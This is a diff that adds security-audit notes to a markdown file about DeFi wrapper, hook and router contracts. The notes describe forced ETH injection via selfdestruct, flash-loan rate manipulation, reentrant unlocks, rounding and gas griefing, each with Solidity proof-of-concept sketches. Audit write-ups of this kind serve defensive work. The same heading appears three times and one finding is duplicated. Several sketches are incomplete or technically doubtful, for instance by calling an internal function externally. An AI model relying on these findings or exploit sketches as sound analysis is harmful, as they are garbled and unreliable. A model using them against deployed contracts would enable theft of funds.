@@ -408,3 +408,118 @@ contract ForceSend {
     }
 }
 ```
+## Tier 3: Vulnerability Report & Exploits
+
+### Vulnerability: Forced Ether Injection
+**Violated Invariant:** `receive` requires `msg.sender == WETH9` in `NativeWrapper.sol`.
+**Attack Path:** An attacker deploys a temporary contract holding ETH and invokes `selfdestruct(target)` with `target` set to the wrapper contract. The forced transfer bypasses the `receive` check because `selfdestruct` does not trigger the `receive` function. The wrapper's ETH balance becomes larger than expected without passing through `_wrap`, breaking assumptions about token balance changes.
+**PoC Sketch (Foundry/Hardhat):**
+```solidity
+contract ForceSend {
+    function attack(address target) external payable {
+        selfdestruct(payable(target));
+    }
+}
+```
+
+### Vulnerability: Flash Loan Rate Manipulation
+**Violated Invariant:** `_deposit` in `WstETHHook.sol` asserts `wstETH minted >= amount`.
+**Attack Path:** Using flash loans, an attacker rapidly mints or burns wstETH around a call to `_beforeSwap` so the exchange rate changes between the deposit and settle steps. The wrapper receives fewer wstETH than expected, violating the invariant that the minted amount covers the deposit.
+**PoC Sketch (Foundry/Hardhat):**
+```solidity
+function testManipulateRate() public {
+    // borrow large stETH, wrap to wstETH altering exchange rate
+    flashLoan(stETH, hugeAmount);
+    wstETH.wrap(hugeAmount);
+    // call hook during manipulated rate window
+    vm.prank(attacker);
+    hook.beforeSwap(...);
+}
+```
+## Tier 3: Vulnerability Report & Exploits
+
+### Vulnerability: Reentrant Unlock via Malicious Hook
+**Violated Invariant:** BaseActionsRouter.sol - `_executeActions` - `assert(poolManager.unlock called once)`
+**Attack Path:**
+1. Deploy a custom hook contract that calls the router again from its callback.
+2. User invokes `BaseActionsRouter._executeActions` with an action that triggers the hook.
+3. During `poolManager.unlock`, the hook's callback reenters `_executeActions`, causing a second `unlock` call before the first finishes.
+4. Nested unlocks allow multiple modifications and violate the invariant that the pool manager is unlocked only once per call.
+**PoC Sketch (Foundry/Hardhat):**
+```solidity
+function testReentrantUnlock() public {
+    bytes memory actions = abi.encodePacked(uint8(Actions.SWAP_EXACT_IN));
+    bytes[] memory params = new bytes[](1);
+    params[0] = abi.encode(swapParams); // crafted swap to trigger hook
+    router.executeActions(actions, params); // hook reenters here
+    // expect state corruption or double unlock
+}
+```
+
+### Vulnerability: Rounding Attack on wstETH Hook
+**Violated Invariant:** BaseTokenWrapperHook.sol - `_beforeSwap` - `assert(delta == deposit - withdraw)`
+**Attack Path:**
+1. Borrow a minimal amount of stETH via flash loan.
+2. Call the wstETH hook to wrap this amount where `wstETH.wrap` rounds down to zero.
+3. The hook records a deposit of 1 wei stETH but zero wstETH minted.
+4. The swap delta becomes zero while the deposit was non-zero, breaking the expected equality.
+**PoC Sketch (Foundry/Hardhat):**
+```solidity
+function testRoundingExploit() public {
+    uint256 tinyAmount = 1; // 1 wei stETH
+    deal(address(stETH), address(hook), tinyAmount);
+    hook.swapExactIn(tinyAmount); // delta becomes 0 due to rounding
+    // assert that delta != tinyAmount
+}
+```
+
+### Vulnerability: Gas Griefing on Notifier
+**Violated Invariant:** Notifier.sol - Notification Hooks - `require(gasleft() >= unsubscribeGasLimit)` and `assert(callback executed or skipped)`
+**Attack Path:**
+1. Deploy a subscriber contract whose `notifyUnsubscribe` consumes all provided gas and reverts.
+2. Subscribe this contract to a position.
+3. Call `unsubscribe` with exactly `unsubscribeGasLimit` gas so the pre-check passes.
+4. The subscriber reverts, consuming gas and leaving the position locked until a new transaction succeeds, violating the expectation that the callback completes or is skipped.
+**PoC Sketch (Foundry/Hardhat):**
+```solidity
+function testGasGriefUnsubscribe() public {
+    GriefSubscriber sub = new GriefSubscriber();
+    positionManager.subscribe(tokenId, address(sub), "");
+    vm.prank(user, user, unsubscribeGas);
+    positionManager.unsubscribe(tokenId); // reverts due to gas exhaustion
+}
+```
+## Tier 3: Vulnerability Report & Exploits
+
+### Vulnerability: Forced ETH Injection via Selfdestruct
+**Violated Invariant:** base/NativeWrapper.sol `receive` - `require(msg.sender == WETH9)`
+**Attack Path:** An attacker deploys a helper contract funded with ETH. This helper contract self-destructs to the NativeWrapper address. Because `selfdestruct` transfers ETH without calling `receive`, the `msg.sender` check is bypassed and ETH is forcibly sent to the contract, violating the assumption that only WETH9 can send ETH.
+**PoC Sketch (Foundry):**
+```solidity
+contract ForceSend {
+    constructor() payable {}
+    function attack(address target) external {
+        selfdestruct(payable(target));
+    }
+}
+```
+Deploy `ForceSend` with ETH and call `attack(NativeWrapper)`.
+
+### Vulnerability: Reentrancy Triggering Multiple Unlocks
+**Violated Invariant:** base/BaseActionsRouter.sol `_executeActions` - `assert(poolManager.unlock called once)`
+**Attack Path:** A malicious subscriber or hook contracts uses its callback during `poolManager.unlock` to invoke the router again. This nested call leads to a second `poolManager.unlock` execution in the same transaction, breaking the invariant and potentially corrupting router state.
+**PoC Sketch (Foundry):**
+```solidity
+contract MalHook is ISubscriber {
+    BaseActionsRouter router;
+    bytes data;
+    constructor(BaseActionsRouter _router, bytes memory _data) {router = _router; data = _data;}
+    function notifySubscribe(uint256, bytes calldata) external {}
+    function notifyUnsubscribe(uint256) external {}
+    function notifyModifyLiquidity(uint256, int256, BalanceDelta) external {
+        router._executeActions(data); // reenter while unlock in progress
+    }
+    function notifyBurn(uint256, address, PositionInfo calldata, uint256, BalanceDelta calldata) external {}
+}
+```
+Register `MalHook` as a subscriber and trigger a liquidity change to demonstrate reentrancy.
